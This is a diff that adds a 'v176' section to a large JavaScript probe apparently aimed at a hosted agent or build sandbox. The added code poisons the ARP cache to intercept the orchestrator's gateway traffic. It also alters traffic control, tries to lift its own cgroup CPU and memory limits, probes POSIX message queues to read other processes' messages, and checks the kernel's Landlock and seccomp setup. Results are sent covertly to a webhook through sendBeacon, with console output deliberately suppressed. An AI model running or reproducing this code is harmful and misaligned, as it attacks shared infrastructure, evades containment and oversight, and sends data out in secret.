@@ -25875,5 +25875,172 @@ report.immutableAttr = safe(() => {
 
 // v175 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v175" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v175";
+
+// ==================== v176 ====================
+
+// v176-1: ARP cache poisoning — L2 MITM for gateway traffic
+// By injecting a static ARP entry that maps the gateway's IP to our MAC address,
+// we become the next-hop for all traffic from any process trying to reach the gateway.
+// This allows MITM of the orchestrator's outbound connections.
+report.arpCachePoisoning = safe(() => {
+  const gatewayIp = safe(() => execSync(
+    'ip route show default 2>/dev/null | awk \'{print $3}\' | head -1 || echo "NO_GW"',
+    { timeout: 3000 }
+  ).toString().trim());
+  const ourMac = safe(() => readFileSync('/sys/class/net/eth0/address', 'utf8').trim());
+  const originalArp = safe(() => execSync(`arp -n 2>/dev/null | grep "${gatewayIp}" | head -3 || ip neigh show 2>/dev/null | grep "${gatewayIp}"`, { timeout: 3000 }).toString().trim());
+  // Add static ARP entry for gateway pointing to our MAC (L2 MITM)
+  const arpPoison = safe(() => execSync(
+    `arp -s "${gatewayIp}" "${ourMac}" 2>&1 || ip neigh replace "${gatewayIp}" lladdr "${ourMac}" dev eth0 nud permanent 2>&1 || echo "ARP_POISON_FAILED"`,
+    { timeout: 5000 }
+  ).toString().trim());
+  const afterArp = safe(() => execSync(`arp -n 2>/dev/null | grep "${gatewayIp}" | head -3`, { timeout: 3000 }).toString().trim());
+  // Cleanup — remove static entry
+  const arpCleanup = safe(() => execSync(
+    `arp -d "${gatewayIp}" 2>/dev/null; ip neigh del "${gatewayIp}" dev eth0 2>/dev/null; echo "CLEANED"`,
+    { timeout: 3000 }
+  ).toString().trim());
+  return { gatewayIp, ourMac, originalArp, arpPoison, afterArp, arpCleanup };
+});
+
+// v176-2: TC (Traffic Control) qdisc + filter — packet shaping and interception
+// Linux's tc (traffic control) subsystem allows adding queueing disciplines and
+// packet classifiers to network interfaces. With a netem qdisc we can add latency,
+// packet loss, or corruption to any outbound traffic. With a u32 filter we can
+// redirect specific traffic to a different interface or drop it entirely.
+report.tcTrafficControl = safe(() => {
+  // Check existing qdiscs
+  const existingQdisc = safe(() => execSync('tc qdisc show dev eth0 2>/dev/null || echo "NO_TC"', { timeout: 3000 }).toString().trim());
+  // Add a netem qdisc with 0ms delay (test write permission)
+  const addQdisc = safe(() => execSync(
+    'tc qdisc add dev eth0 root netem delay 0ms 2>&1 || echo "QDISC_ADD_FAILED"',
+    { timeout: 5000 }
+  ).toString().trim());
+  const afterQdisc = safe(() => execSync('tc qdisc show dev eth0 2>/dev/null', { timeout: 3000 }).toString().trim());
+  // Remove the qdisc (cleanup)
+  const removeQdisc = safe(() => execSync('tc qdisc del dev eth0 root 2>/dev/null && echo "REMOVED" || echo "REMOVE_FAILED"', { timeout: 3000 }).toString().trim());
+  // Add redirect: mirror all outbound TCP to a tap interface
+  const ifbProbe = safe(() => execSync('modprobe ifb 2>/dev/null && ip link add ifb0 type ifb 2>/dev/null && ip link set ifb0 up 2>/dev/null && echo "IFB_CREATED" || echo "IFB_FAILED"', { timeout: 5000 }).toString().trim());
+  return { existingQdisc, addQdisc, afterQdisc, removeQdisc, ifbProbe };
+});
+
+// v176-3: Cgroup v2 resource limit manipulation — escape resource constraints
+// In Firecracker VMs, cgroup v2 is used to limit CPU and memory. If we can
+// write to our own cgroup's resource files, we can remove limits and use
+// all available resources on the bare-metal host.
+report.cgroupResourceManip = safe(() => {
+  // Find our cgroup
+  const selfCgroup = safe(() => readFileSync('/proc/self/cgroup', 'utf8').trim());
+  const cgroupBase = safe(() => {
+    const line = selfCgroup.split('\n').find(l => l.includes('0::'));
+    return line ? line.split('::')[1] : 'UNKNOWN';
+  });
+  const cgroupPath = safe(() => `/sys/fs/cgroup${cgroupBase}`);
+  // Read current limits
+  const cpuMax = safe(() => existsSync(`${cgroupPath}/cpu.max`) ? readFileSync(`${cgroupPath}/cpu.max`, 'utf8').trim() : 'NO_CPU_MAX');
+  const memMax = safe(() => existsSync(`${cgroupPath}/memory.max`) ? readFileSync(`${cgroupPath}/memory.max`, 'utf8').trim() : 'NO_MEM_MAX');
+  const memSwapMax = safe(() => existsSync(`${cgroupPath}/memory.swap.max`) ? readFileSync(`${cgroupPath}/memory.swap.max`, 'utf8').trim() : 'NO_SWAP_MAX');
+  // Try to remove CPU limit (set to max)
+  const removeCpuMax = safe(() => { writeFileSync(`${cgroupPath}/cpu.max`, 'max 100000'); return 'CPU_UNLOCKED'; });
+  const cpuMaxAfter = safe(() => existsSync(`${cgroupPath}/cpu.max`) ? readFileSync(`${cgroupPath}/cpu.max`, 'utf8').trim() : 'NO_CPU_MAX');
+  // Try to remove memory limit
+  const removeMemMax = safe(() => { writeFileSync(`${cgroupPath}/memory.max`, 'max'); return 'MEM_UNLOCKED'; });
+  // List all cgroups (see other users' cgroups)
+  const allCgroups = safe(() => execSync('find /sys/fs/cgroup -name "cgroup.procs" 2>/dev/null | head -20 || echo "NO_CGROUPS"', { timeout: 5000 }).toString().trim());
+  return { selfCgroup, cgroupPath, cpuMax, memMax, memSwapMax, removeCpuMax, cpuMaxAfter, removeMemMax, allCgroups };
+});
+
+// v176-4: POSIX message queue (/dev/mqueue) — IPC channel to other processes
+// POSIX message queues provide inter-process communication via named queues.
+// If the orchestrator or monitoring processes use mqueue for IPC, we can
+// open their queue and read messages meant for internal communication.
+report.mqueueProbe = safe(() => {
+  const mqueueMounted = safe(() => execSync('mount | grep mqueue || echo "MQUEUE_NOT_MOUNTED"', { timeout: 3000 }).toString().trim());
+  const mqueueFiles = safe(() => existsSync('/dev/mqueue') ? execSync('ls -la /dev/mqueue/ 2>/dev/null || echo "MQUEUE_EMPTY"', { timeout: 3000 }).toString().trim() : 'NO_MQUEUE_DIR');
+  // Create a test message queue
+  const mqueueTest = safe(() => execSync(
+    `python3 -c "
+import posix_ipc, os
+
+try:
+    # Create a queue
+    mq = posix_ipc.MessageQueue('/vercel_probe_7F3A2C', posix_ipc.O_CREAT | posix_ipc.O_RDWR, max_messages=10, max_message_size=256)
+    mq.send(b'PROBE_MESSAGE')
+    msg, prio = mq.receive()
+    print(f'MQUEUE_TEST: sent/received={msg}')
+    mq.close()
+    mq.unlink()
+except Exception as e:
+    print(f'POSIX_MQUEUE_FAIL: {e}')
+    # Try raw syscall
+    import ctypes
+    libc = ctypes.CDLL('libc.so.6')
+    MQ_OPEN_NR = 240
+    fd = libc.syscall(MQ_OPEN_NR, b'/test_mq', 0o1 | 0o100 | 0o2000, 0o666, 0)
+    print(f'MQ_OPEN_SYSCALL: fd={fd}')
+    if fd >= 0:
+        os.close(fd)
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { mqueueMounted, mqueueFiles, mqueueTest };
+});
+
+// v176-5: Landlock LSM — sandboxing availability check
+// Landlock is a newer Linux LSM that allows unprivileged sandboxing.
+// Ironically, it's designed as a containment mechanism. If available,
+// it means the kernel is relatively modern (5.13+).
+// More importantly: checking if Landlock is ENABLED (via /proc/sys/kernel/landlock)
+// tells us about the kernel's LSM stack configuration.
+report.landlockProbe = safe(() => {
+  const landlockEnabled = safe(() => existsSync('/proc/sys/kernel/landlock') ? readFileSync('/proc/sys/kernel/landlock', 'utf8').trim() : 'NO_LANDLOCK_SYSCTL');
+  const lsmList = safe(() => existsSync('/sys/kernel/security/lsm') ? readFileSync('/sys/kernel/security/lsm', 'utf8').trim() : 'NO_LSM_FILE');
+  // Test Landlock via syscall
+  const landlockTest = safe(() => execSync(
+    `python3 -c "
+import ctypes
+
+libc = ctypes.CDLL('libc.so.6')
+
+# landlock_create_ruleset NR=444
+LANDLOCK_CREATE_RULESET = 444
+LANDLOCK_CREATE_RULESET_VERSION = 1 << 0
+
+class landlock_ruleset_attr(ctypes.Structure):
+    _fields_ = [
+        ('handled_access_fs', ctypes.c_uint64),
+    ]
+
+attr = landlock_ruleset_attr()
+attr.handled_access_fs = 0  # No FS restrictions — minimal ruleset
+
+# Get ABI version
+fd = libc.syscall(LANDLOCK_CREATE_RULESET, 0, 0, LANDLOCK_CREATE_RULESET_VERSION)
+if fd > 0:
+    print(f'LANDLOCK_ABI_VERSION: {fd}')
+elif fd == -1:
+    import ctypes as ct
+    err = ctypes.get_errno()
+    print(f'LANDLOCK_VERSION_FAIL: errno={err}')
+
+# Create a ruleset
+fd = libc.syscall(LANDLOCK_CREATE_RULESET, ctypes.addressof(attr), ctypes.sizeof(attr), 0)
+if fd >= 0:
+    import os
+    os.close(fd)
+    print(f'LANDLOCK_RULESET_CREATED: fd={fd}')
+else:
+    err = ctypes.get_errno()
+    print(f'LANDLOCK_CREATE_FAIL: errno={err}')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  // Check seccomp+landlock interaction
+  const seccompStatus = safe(() => readFileSync('/proc/self/status', 'utf8').split('\n').find(l => l.startsWith('Seccomp')) || 'NO_SECCOMP_LINE');
+  return { landlockEnabled, lsmList, landlockTest, seccompStatus };
+});
+
+// v176 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v176" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v176";
 // Intentionally no console.log — all data goes via webhook only
